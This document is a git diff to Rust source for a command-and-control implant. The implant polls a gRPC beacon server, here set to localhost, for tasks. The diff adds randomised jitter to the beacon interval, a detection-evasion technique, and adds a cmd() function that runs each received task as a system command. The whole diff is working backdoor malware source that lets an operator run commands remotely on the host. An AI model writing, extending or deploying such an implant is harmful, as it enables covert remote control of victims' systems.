@@ -1,7 +1,8 @@
+use rand::Rng;
 use std::time::Duration;
 
 use tasks::{beacon_service_client::BeaconServiceClient, ConnectionRequest, PollRequest};
-use tokio::time;
+use tokio::{process::Command, time};
 use tonic::transport::Channel;
 pub mod tasks {
     tonic::include_proto!("tasks");
@@ -10,7 +11,7 @@ pub mod tasks {
 struct Implant {
     client: BeaconServiceClient<Channel>,
     uuid: String,
-    pub heartbeat: u32,
+    heartbeat: u32,
 }
 
 impl Implant {
@@ -43,7 +44,18 @@ impl Implant {
         Ok(response.shellcode)
     }
 
-    // pub fn jitter(&self) -> u64 {}
+    pub fn jitter(&self) -> u64 {
+        let offset = self.heartbeat as f32 / 100f32;
+        rand::thread_rng()
+            .gen_range(self.heartbeat as f32 - offset..=self.heartbeat as f32 + offset)
+            as u64
+    }
+
+    pub async fn cmd(task: String) -> Result<(), Box<dyn std::error::Error>> {
+        let output = Command::new(task).output().await?;
+        println!("Out: {}", String::from_utf8_lossy(&output.stdout));
+        Ok(())
+    }
 }
 
 #[tokio::main]
@@ -51,10 +63,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut implant = Implant::connect("http://[::1]:50055").await?;
 
     loop {
-        time::sleep(Duration::from_millis(implant.heartbeat.into())).await;
+        time::sleep(Duration::from_millis(implant.jitter())).await;
 
         if let Some(s) = implant.poll().await.expect("Fail") {
             println!("Shellcode: {s}");
+            Implant::cmd(s).await?;
         }
     }
 }
